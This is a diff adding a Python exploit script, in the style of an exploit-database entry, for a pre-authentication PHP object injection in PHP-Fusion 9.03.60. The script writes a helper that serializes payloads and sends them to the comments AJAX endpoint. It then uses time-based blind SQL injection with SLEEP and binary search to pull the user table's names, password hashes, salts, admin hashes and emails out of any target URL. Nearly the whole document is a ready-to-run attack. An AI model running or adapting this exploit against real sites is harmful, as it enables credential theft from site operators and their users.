@@ -1,0 +1,205 @@
+# Exploit Title: PHP-Fusion 9.03.60 - PHP Object Injection
+# Date: 2020-05-26
+# Exploit Author: coiffeur
+# Vendor Homepage: https://www.php-fusion.co.uk/home.php
+# Software Link: https://www.php-fusion.co.uk/php_fusion_9_downloads.php
+# Version: v9.03.60
+
+# Description:
+# PHP Object Injection to SQL injection (pre-auth)
+
+
+import sys
+
+import requests
+
+import subprocess
+
+GENERATOR_NAME = "gen.php"
+GENERATOR_CONTENT = """<?php
+if (count($argv) < 2) {
+    echo 'Usage: php gen.php "<PAYLOAD>"';
+    die;
+}
+
+$ar["comment_item_id"] = "1";
+$ar["comment_item_type"] = $argv[1];
+
+$payload = urlencode(base64_encode(serialize($ar)));
+echo $payload;
+?>
+"""
+
+
+DEBUG = 1
+DELTA = None
+TRESHOLD = 0.60
+LIKE = "f%admin"
+COLUMNS = ["user_id", "user_name", "user_algo", "user_salt", "user_password",
+           "user_admin_algo", "user_admin_salt", "user_admin_password", "user_email"]
+
+
+def usage():
+    banner = """NAME: PHPFusion v9.03.50, PHP Object Injection to SQL injection
+SYNOPSIS: python poi_to_sqli_9.03.50.py <URL>
+DESCRIPTION:
+    Dump the content of the table named fusionX...X_users
+AUTHOR: coiffeur
+    """
+    print(banner)
+
+
+def generator(action):
+    if action == "w":
+        with open(GENERATOR_NAME, "w") as f:
+            f.write(GENERATOR_CONTENT)
+    if action == "r":
+        _ = subprocess.Popen(["rm", GENERATOR_NAME], stdout=subprocess.PIPE)
+
+
+def generate_payload(text):
+    p = subprocess.Popen(["php", GENERATOR_NAME, text], stdout=subprocess.PIPE)
+    out, _ = p.communicate()
+    return out
+
+
+def check(payload):
+    datas = {"comment_options": generate_payload(payload)}
+    r = requests.post(
+        url=f"{sys.argv[1]}/includes/classes/PHPFusion/Feedback/Comments.ajax.php", data=datas)
+    return r.elapsed.total_seconds()
+
+
+def evaluate_delay():
+    global DELTA
+    deltas = []
+    payload = "' UNION SELECT SLEEP(2)-- - '"
+    for _ in range(3):
+        deltas.append(check(payload))
+    DELTA = sum(deltas)/len(deltas)
+
+
+def get_tbl_name_len():
+    i = 0
+    while 1:
+        payload = f"' UNION SELECT (CASE WHEN (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_name LIKE '{LIKE}' )<{i} THEN SLEEP(2) ELSE 0 END) -- - '"
+        if check(payload) >= DELTA*TRESHOLD:
+            return i-1
+        if i > 100:
+            print(f"[x] Exploit failed")
+            exit(-1)
+        i += 1
+
+
+def get_tbl_name(length):
+    tbl_name = ""
+    for i in range(1, length+1):
+        min, max = 0, 127-1
+        while min < max:
+            mid = (max + min) // 2
+            payload = f"' UNION SELECT (CASE WHEN (SELECT ASCII(SUBSTR(table_name,{i},1)) FROM information_schema.tables WHERE table_name LIKE '{LIKE}' )<={mid} THEN SLEEP(2) ELSE 0 END) -- - '"
+            if check(payload) >= DELTA*TRESHOLD:
+                max = mid
+            else:
+                min = mid + 1
+        tbl_name += chr(min)
+        if DEBUG:
+            print(f"[DEBUG] Table name: {tbl_name}")
+    return tbl_name
+
+
+def get_rows_number(tbl_name):
+    i = 0
+    while 1:
+        payload = f"' UNION SELECT (CASE WHEN (SELECT COUNT(user_name) FROM {tbl_name})>{i} THEN 0 ELSE SLEEP(2) END) -- - '"
+        if check(payload) >= DELTA*TRESHOLD:
+            return i
+        i += 1
+
+
+def get_elt_len(tbl_name, column_name, offset):
+    i = 0
+    while 1:
+        payload = f"' UNION SELECT (CASE WHEN (SELECT LENGTH({column_name}) FROM {tbl_name} LIMIT 1 OFFSET {offset})<{i} THEN SLEEP(2) ELSE 0 END) -- - '"
+        if check(payload) >= DELTA*TRESHOLD:
+            if DEBUG:
+                print(
+                    f"[DEBUG] Element {offset} in {column_name} from {tbl_name} length: {i-1}")
+            return i-1
+        i += 1
+
+
+def get_elt(tbl_name, column_name, offset, length):
+    elt = ""
+    for i in range(1, length+1):
+        min, max = 0, 127-1
+        while min < max:
+            mid = (max + min) // 2
+            payload = f"' UNION SELECT (CASE WHEN (SELECT ASCII(SUBSTR({column_name},{i},1)) FROM {tbl_name} LIMIT 1 OFFSET {offset} )<={mid} THEN SLEEP(2) ELSE 0 END) -- - '"
+            if check(payload) >= DELTA*TRESHOLD:
+                max = mid
+            else:
+                min = mid + 1
+        elt += chr(min)
+        if DEBUG:
+            print(
+                f"[DEBUG] Element {offset} in {column_name} from {tbl_name}: {elt}")
+    print(f"[*] Element {offset} in {column_name} from {tbl_name}: {elt}")
+    return elt
+
+
+def get_rows(tbl_name, row_number):
+    print(f"[*] Trying to dump {tbl_name}")
+    rows = []
+    for offset in range(row_number):
+        row = []
+        for column_name in COLUMNS:
+            elt_length = get_elt_len(tbl_name, column_name, offset)
+            row.append(get_elt(tbl_name, column_name, offset, elt_length))
+        print(f"[*] Row {offset}: {row}")
+        rows.append(row)
+    print(f"[*] Rows: {rows}")
+
+
+def main():
+    if len(sys.argv) < 2:
+        print(usage())
+        exit(-1)
+
+    if DEBUG:
+        print(f"[*] Target: {sys.argv[1]}")
+
+    if DEBUG:
+        print(f"[DEBUG] Writting generator to {GENERATOR_NAME}")
+    generator("w")
+
+    evaluate_delay()
+    if DEBUG:
+        print(f"[*] Delta: {DELTA}")
+
+    tbl_name_len = get_tbl_name_len()
+    if DEBUG:
+        print(
+            f"[DEBUG] Looking for table like {LIKE} with length {tbl_name_len}")
+
+    tbl_name = get_tbl_name(tbl_name_len)
+    print(f"    Table name: {tbl_name}")
+
+    prefix = f"{tbl_name.split('_')[0]}_"
+    print(f"[*] Prefix: {prefix}")
+
+    user_table_name = f"{prefix}users"
+
+    number_of_rows = get_rows_number(user_table_name)
+    if DEBUG:
+        print(f"[*] {user_table_name} got {number_of_rows} rows")
+
+    get_rows(user_table_name, number_of_rows)
+
+    if DEBUG:
+        print(f"[DEBUG] Removing  {GENERATOR_NAME}")
+    generator("r")
+
+
+if __name__ == "__main__":
+    main()
